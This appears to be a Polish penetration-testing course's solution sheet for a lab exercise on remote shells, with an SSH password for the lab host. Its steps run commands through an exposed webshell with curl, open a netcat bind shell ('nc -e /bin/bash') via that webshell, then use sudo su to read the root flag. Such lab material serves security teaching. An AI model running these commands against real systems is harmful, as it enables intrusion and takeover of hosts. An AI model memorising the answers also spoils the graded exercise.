---
title: cw06_p.md
description: Zadania PENTEST
order: 2
---

## 6.1p - Przeglądarka Lynx

```bash
ssh student@192.168.100.106 #Password: pjatk
lynx 192.168.200.156
```

## 6.2p - Ujawniony plik tymczasowy

> **Uwaga do rozwiązania:** Źródło wykorzystuje `.command.txt.swp`; slajdy `.bash_history`. Oba warianty ujawniają sposób użycia webshella.

```bash
lynx 192.168.200.156
#Open the hidden .command.txt.swp file from the directory listing
```

## 6.3p - Wykonanie polecenia przez webshell

```bash
#Quit Lynx with q, then run on student@remote-shells-homework:
curl 'http://192.168.200.156/cmd.php?c=id%20webadmin'
```

## 6.4p - Bind shell uruchomiony przez HTTP

> **Uwaga do rozwiązania:** Oba terminale są na maszynie pośredniej. Pierwsze żądanie curl może czekać, dopóki działa uruchomiona powłoka. Łączysz się z nią z drugiego terminala.

```bash
#Remote Shells HOMEWORK - terminal 1:
curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'

#Remote Shells HOMEWORK - terminal 2:
nc 192.168.200.156 7331
```

## 6.5p - Flaga roota

```bash
#Use the nc terminal from 6.4 (rerun 6.4 if closed):
sudo su
cat /root/root.txt
#Submit the flag on the platform
```
